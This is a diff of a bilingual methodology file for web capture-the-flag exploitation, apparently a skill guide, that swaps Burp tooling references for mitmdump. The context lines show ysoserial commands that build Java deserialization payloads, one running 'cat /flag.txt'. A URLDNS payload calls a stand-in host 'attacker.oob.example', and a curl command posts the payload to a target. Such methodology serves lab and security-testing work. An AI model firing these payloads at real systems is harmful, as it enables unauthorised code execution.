@@ -40,7 +40,7 @@ Sigue los pasos y referencias del contenido base de esta habilidad.
 - Objetivo inicial: confirmar una primitiva web pequeña (read, bypass o SSRF interno) antes de cadenas largas.
 - Orden recomendado: recon de superficie -> validacion de input sink -> PoC minimo -> escalado.
 - Tiempo maximo por hipotesis: 10-15 minutos; si no hay señal, pivota a otro bug family.
-- Salida minima util: request reproducible (raw curl/Burp headless (sin GUI)), respuesta esperada y condicion de exito.
+- Salida minima util: request reproducible (raw curl/mitmdump), respuesta esperada y condicion de exito.
 
 ## Contenido base
 
@@ -72,7 +72,7 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
 - Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
 - Content-Type `application/x-java-serialized-object`
-- Burp headless scan profile para Java deserialization + validacion manual de magic bytes
+- mitmdump + validacion manual de magic bytes para Java deserialization
 
 **Key insight:** Deserialization triggers code in `readObject()` methods of classes on the classpath. If a "gadget chain" exists (sequence of classes whose `readObject` → method calls lead to arbitrary execution), the attacker gets RCE without needing to upload code.
 
@@ -89,7 +89,7 @@ java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser
 # Spring1/Spring2 (Spring Framework)
 
 # Blind detection via DNS callback (no RCE needed):
-java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
+java -jar ysoserial.jar URLDNS 'http://attacker.oob.example' | base64
 
 # Send payload
 curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
